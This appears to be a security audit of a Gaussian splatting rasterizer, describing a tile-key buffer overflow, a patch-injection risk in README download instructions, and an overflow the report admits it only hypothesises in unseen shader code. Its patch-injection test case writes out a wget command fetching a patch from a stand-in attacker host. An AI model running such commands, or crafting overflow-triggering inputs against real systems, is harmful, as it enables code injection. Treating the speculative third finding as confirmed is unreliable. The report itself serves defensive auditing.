## Combined Vulnerability List

### 1. Buffer Overflow in Tile Key Generation

- **Description:**
    1. An attacker crafts a malicious 3D scene or Gaussian dataset where at least one Gaussian is designed to cover an exceptionally large number of tiles when projected onto the image plane. This can be achieved by manipulating the Gaussian's scale and position.
    2. During the vertex shader stage (`vertex_shader.slang`), the number of tiles touched by this malicious Gaussian is calculated and stored in `tiles_touched` for this Gaussian. Due to the crafted Gaussian properties, this value becomes excessively large.
    3. In the tile shader stage (`tile_shader_slang.py`), the `total_size_index_buffer` is computed by summing up the `tiles_touched` values for all Gaussians using `torch.cumsum`. This `total_size_index_buffer` determines the allocation size for `unsorted_keys` and `unsorted_gauss_idx` tensors.
    4. The `generate_keys` kernel in `tile_shader.slang` is then launched. For each Gaussian, this kernel iterates up to `tiles_touched[gaussian_idx]` times, writing tile keys and Gaussian indices into `out_unsorted_keys` and `out_unsorted_gauss_idx` at indices calculated using `index_buffer_offset`.
    5. Due to the maliciously inflated `tiles_touched` value from the crafted Gaussian, the loop in `generate_keys` attempts to write far beyond the allocated bounds of `out_unsorted_keys` and `out_unsorted_gauss_idx`, causing a buffer overflow.

- **Impact:** Memory corruption, potentially leading to arbitrary code execution. An attacker could potentially overwrite critical data or inject malicious code into memory by controlling the content written during the buffer overflow.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:** None. There are no input validations or bounds checks in place to prevent a Gaussian from touching an excessive number of tiles or to prevent buffer overflows in the key generation process.

- **Missing Mitigations:**
    - **Input Validation:** Implement validation checks on the input Gaussian dataset to limit the maximum size and screen-space projection area of Gaussians. This could involve setting maximum scale limits or validating the projected bounding box size to prevent excessively large tile coverage.
    - **Tile Count Limiting:** Enforce a maximum limit on the number of tiles a single Gaussian can interact with. If a Gaussian exceeds this limit, it could be clamped or discarded.
    - **Bounds Checking in Shader:** Introduce explicit bounds checking within the `generate_keys` shader to ensure that writes to `out_unsorted_keys` and `out_unsorted_gauss_idx` are always within the allocated buffer boundaries.
    - **Safer Integer Types:** Use larger integer types (e.g., `int64_t` in Slang and `torch.int64` in Python) for `tiles_touched` and related size calculations to reduce the risk of integer overflows, although the primary issue is buffer overflow, not integer overflow itself causing incorrect size calculation.

- **Preconditions:**
    - The attacker must be able to provide a maliciously crafted 3D scene or Gaussian splat dataset as input to the Slang.D rasterizer. This is the primary attack vector as described in the project description.

- **Source Code Analysis:**
    - **`slang_gaussian_rasterization/internal/tile_shader_slang.py`:**
        - Line 87: `index_buffer_offset = torch.cumsum(tiles_touched, dim=0, dtype=tiles_touched.dtype)` calculates cumulative sum of `tiles_touched`.
        - Line 88: `total_size_index_buffer = index_buffer_offset[-1]` gets the total size from the last element of `index_buffer_offset`.
        - Line 89 & 92: `unsorted_keys` and `unsorted_gauss_idx` tensors are allocated with `total_size_index_buffer`.
    - **`slang_gaussian_rasterization/internal/slang/tile_shader.slang` - `generate_keys` kernel:**
        ```slang
        kernel void generate_keys(
            // ... inputs ...
            WBuffer<uint64_t> out_unsorted_keys,
            WBuffer<int> out_unsorted_gauss_idx,
            uint32_t grid_height,
            uint32_t grid_width)
        {
            uint32_t gaussian_idx = dispatchThreadID().x;
            int32_t tile_count = tiles_touched[gaussian_idx];
            int32_t offset = index_buffer_offset[gaussian_idx];

            for(int tile_id_idx = 0; tile_id_idx < tile_count; ++tile_id_idx)
            {
                int2 tile_pos_rect = rect_tile_space[gaussian_idx][tile_id_idx];
                uint32_t tile_id_linear = tile_pos_rect.y * grid_width + tile_pos_rect.x;
                uint64_t key = ((uint64_t)tile_id_linear << 32) | (0xFFFFFFFF - gaussian_idx);

                int write_idx = offset + tile_id_idx; // Potential out-of-bounds write
                out_unsorted_keys[write_idx] = key;
                out_unsorted_gauss_idx[write_idx] = gaussian_idx;
            }
        }
        ```
        - The loop condition `tile_id_idx < tile_count` uses `tiles_touched[gaussian_idx]` to control the number of iterations.
        - `write_idx = offset + tile_id_idx` calculates the write index. If `tile_count` (derived from attacker-controlled Gaussian data) is excessively large, `write_idx` can exceed the allocated buffer size, leading to a buffer overflow when writing to `out_unsorted_keys[write_idx]` and `out_unsorted_gauss_idx[write_idx]`.

- **Security Test Case:**
    1. **Prepare Malicious Input:** Create a Python script to generate a Gaussian dataset. In this dataset, include at least one Gaussian with extremely large scales (e.g., scales = `torch.tensor([1e5, 1e5, 1e5])`) and position it such that its projection covers a significant portion of the image, thus touching a large number of tiles.
    2. **Integrate with Rasterizer:** Modify or create a test script that uses the `slang_gaussian_rasterization` library to render an image using this malicious Gaussian dataset. Use either `api/gsplat_3dgs.py` or `api/inria_3dgs.py` as a base for integration.
    3. **Run with Memory Sanitizer:** Execute the test script with a memory error detection tool like AddressSanitizer (ASan). For example, if using Linux and compiling the Slang.D library with appropriate flags, run the Python script with `ASAN_OPTIONS=detect_leaks=0 python your_test_script.py`.
    4. **Observe for Memory Error:** Run the script and observe the output for AddressSanitizer error reports. A successful exploit will trigger an ASan error indicating an out-of-bounds write during the execution of the `generate_keys` kernel or in memory operations immediately following it. The error report will pinpoint the location of the memory corruption.
    5. **Analyze Crash (Optional):** If ASan is not available, run the script normally and observe for crashes or unusual behavior. While crashes might occur, they are less reliable for pinpointing the exact vulnerability than using a memory sanitizer. Examine core dumps or error logs if a crash occurs to investigate the cause.

### 2. Malicious Patch Injection

- **Description:**
    - The project README provides instructions on how to integrate the Slang.D rasterizer with existing 3D Gaussian Splatting implementations (Inria and gsplat) by downloading and applying patch files.
    - Users are instructed to use `wget` to download patch files directly from the repository via raw GitHub URLs.
    - An attacker could replace the legitimate patch files hosted in the repository with malicious patch files.
    - If a user follows the instructions and downloads and applies a malicious patch, the `git am` command will apply the patch, injecting potentially malicious code into the user's local 3DGS codebase.
    - This injected code could be executed when the user runs their 3DGS training or rendering scripts.
- **Impact:**
    - Code injection into the user's 3D Gaussian Splatting implementation.
    - Arbitrary code execution on the user's machine when they run the patched 3DGS software.
    - Potential for data theft, system compromise, or other malicious activities depending on the attacker's payload within the malicious patch.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - None. The project does not implement any mechanism to verify the integrity or authenticity of the patch files. It relies on users implicitly trusting the provided URLs and the GitHub platform.
- **Missing Mitigations:**
    - **Patch Integrity Verification:** Implement a mechanism to ensure the integrity of the patch files. This could involve:
        - Providing checksums (e.g., SHA256 hashes) of the patch files in the README, allowing users to manually verify the downloaded patches before applying them.
        - Digitally signing the patch files, although this might be more complex to implement and manage in this context.
    - **User Warning:** Add a clear warning in the README.md file advising users about the security risks of applying patches from any source without proper verification. Recommend users to verify the integrity of downloaded patches before applying them.
- **Preconditions:**
    - The user must follow the integration instructions provided in the README.md file.
    - The attacker must be able to replace the legitimate patch file on the repository (or convince users to download a malicious patch from a different source).
- **Source Code Analysis:**
    - **/code/README.md**:
        - The "Using it with popular 3DGS optimization libraries" section provides instructions to download patch files using `wget` from raw GitHub URLs:
            ```bash
            wget https://github.com/grgkopanas/slang-gaussian-rasterization/raw/main/slang_gaussian_rasterization/api/patches/3dgs_inria.patch
            git am 3dgs_inria.patch
            ```
        - This method of downloading and applying patches is inherently vulnerable if the patch source is compromised, as `git am` will apply any patch provided without verification.
    - There are no other files in the project that directly mitigate this vulnerability. The vulnerability stems from the integration instructions in the README and the lack of patch integrity checks.
- **Security Test Case:**
    1. **Attacker creates a malicious patch:**
        - Create a file named `malicious_patch.patch` with the following content. This patch is designed to add a print statement to the `train.py` file of the Inria 3DGS repository as a proof of concept for code injection.
        ```patch
        --- a/train.py
        +++ b/train.py
        @@ -1,2 +1,4 @@
         # malicous patch injected
+        print("Malicious patch has been injected and executed!")
         import os, sys, glob, argparse
         import numpy as np
        ```
    2. **Attacker hosts the malicious patch:**
        -  For testing purposes, the attacker can host this `malicious_patch.patch` file on a local web server or a publicly accessible file hosting service.  Assume the malicious patch is accessible at `http://attacker.com/malicious_patch.patch`.
    3. **Victim modifies README instructions (simulated attack):**
        -  The victim, intending to follow the integration instructions, is tricked into using a modified instruction.  Assume the victim replaces the legitimate `wget` command in the README instructions with the following command, pointing to the attacker's malicious patch:
            ```bash
            wget http://attacker.com/malicious_patch.patch -O 3dgs_inria.patch
            git am 3dgs_inria.patch
            ```
    4. **Victim executes modified instructions:**
        - The victim executes the modified commands in their terminal within the Inria 3DGS repository directory, as instructed in the (modified) README.
    5. **Verify code injection:**
        - The victim checks the `train.py` file in their Inria 3DGS repository. They will find the line `print("Malicious patch has been injected and executed!")` added at the beginning of the file, confirming the successful code injection.
    6. **Victim runs the patched code:**
        - The victim executes the `train.py` script as normally instructed by the Inria 3DGS repository documentation.
        - When `train.py` is executed, the message "Malicious patch has been injected and executed!" will be printed to the console *before* the normal execution of the `train.py` script, demonstrating that the injected code is indeed executed.

### 3. Potential Buffer Overflow in Alpha Blending Shader

- **Description:**
    1. An attacker crafts a malicious 3D scene dataset.
    2. When this dataset is processed by a 3D Gaussian Splatting application that uses the Slang.D rasterizer, it leads to specific rendering parameters.
    3. During the alpha blending stage, the `AlphaBlendTiledRender.forward` function is executed, which launches the `alpha_blend_tile_shader.splat_tiled` Slang kernel.
    4. A vulnerability within the `alphablend_shader.slang` code (not provided for review) could cause an incorrect memory access when writing to the `output_img` buffer during tile processing.
    5. This incorrect access results in writing data outside the allocated memory region of the `output_img` tensor, leading to a buffer overflow.
- **Impact:** Memory corruption, potentially leading to arbitrary code execution or program crash.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:** None identified in the provided Python code. The project relies on the memory safety of Slang and CUDA, but custom shader code may contain vulnerabilities.
- **Missing Mitigations:**
    - **Input validation:** for image and tile dimensions (`image_height`, `image_width`, `tile_height`, `tile_width`) in `RenderGrid` and related functions to prevent excessively large or small values that could lead to unexpected behavior in shaders.
    - **Boundary checks:** within the Slang shaders (`alphablend_shader.slang`, `vertex_shader.slang`, `tile_shader.slang`) to ensure all memory write operations are within the bounds of allocated buffers, particularly for the `output_img` buffer in `alphablend_shader.slang`.
    - **Thorough code review:** of all Slang shader code and CUDA kernels (`sort_by_keys_cub.cu`) to identify potential indexing errors, loop boundary issues, and other conditions that could lead to buffer overflows or out-of-bounds memory access.
    - **Robust security testing:** with a variety of 3D scene datasets, including deliberately crafted malicious datasets designed to trigger potential buffer overflows and memory corruption vulnerabilities.
- **Preconditions:**
    - A vulnerable version of the `slang_gaussian_rasterization` library is installed and used by a 3D Gaussian Splatting application.
    - An attacker has the ability to provide a malicious 3D scene dataset to be rendered by the application.
- **Source Code Analysis:**
    - The potential vulnerability is hypothesized to reside in the `alphablend_shader.slang` file, which is not provided for direct analysis.
    - In `/code/slang_gaussian_rasterization/internal/alphablend_tiled_slang.py`, the `AlphaBlendTiledRender.forward` function allocates `output_img` with dimensions based on `render_grid.image_height` and `render_grid.image_width`.
    - The `alpha_blend_tile_shader.splat_tiled` kernel, implemented in Slang, is launched to perform the alpha blending, writing to `output_img`.
    - The vulnerability scenario assumes that the `alphablend_shader.slang` code contains a flaw in index calculation when writing pixel colors to `output_img`. This could arise from incorrect handling of tile or pixel coordinates, or improper bounds checking in loops iterating over Gaussians within a tile.
    - Without access to the `alphablend_shader.slang` source code, the exact location and nature of the potential buffer overflow cannot be determined. However, potential areas of concern are memory write operations to `output_img` within the shader, especially index calculations and loop bounds.
- **Security Test Case:**
    1. **Dataset Creation:** Design a malicious 3D scene dataset specifically intended to trigger a buffer overflow in the alpha blending shader. This may involve scenes with:
        - A very large number of Gaussians to stress memory operations.
        - Gaussians positioned or configured in a way that might expose indexing errors in tile processing.
        - Extreme values for Gaussian properties (e.g., very large scales or opacities) that could lead to unexpected calculations in the shader.
    2. **Environment Setup:**
        - Install the `slang_gaussian_rasterization` library in a test environment, ideally by patching a 3D Gaussian Splatting application like the inria or gsplat codebase as described in the `README.md`.
        - Ensure that the patched application is configured to use the Slang.D rasterizer by default.
    3. **Execution and Monitoring:**
        - Run the patched 3D Gaussian Splatting application with the malicious 3D scene dataset.
        - Employ memory error detection tools like Valgrind or AddressSanitizer during the execution to monitor for memory corruption, specifically buffer overflows.
    4. **Vulnerability Confirmation:**
        - Observe the application for crashes, unexpected termination, or memory error reports from the monitoring tools during rendering with the malicious dataset.
        - Compare the application's behavior when rendering the malicious dataset versus a benign, standard dataset. A crash or memory error specifically with the malicious dataset suggests a potential vulnerability.
        - If a crash or memory error is detected, investigate the circumstances to confirm that it is a buffer overflow originating from the alpha blending shader, potentially by analyzing crash logs or debugging with shader debugging tools if available.
        - Attempt to reproduce the crash reliably and refine the malicious dataset or rendering parameters to pinpoint the conditions that trigger the overflow.
